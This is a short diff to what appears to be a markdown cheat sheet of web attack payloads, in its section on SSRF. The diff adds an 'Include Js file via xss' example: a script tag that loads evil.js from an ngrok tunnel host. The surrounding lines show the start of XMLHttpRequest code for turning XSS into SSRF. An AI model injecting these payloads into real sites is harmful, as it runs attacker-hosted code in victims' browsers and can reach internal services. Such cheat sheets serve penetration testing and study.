@@ -37,6 +37,10 @@ print("[@] Response Body ", req.text)
 > 2. https://hackerone.com/reports/409943
 
 # SSRF
+Include Js file via xss
+```js
+<script src="http://b9f2-109-107-226-121.ngrok.io/evil.js"></script>
+```
 Leveraging XSS to SSRF
 ```js
 var request1 = new XMLHttpRequest();
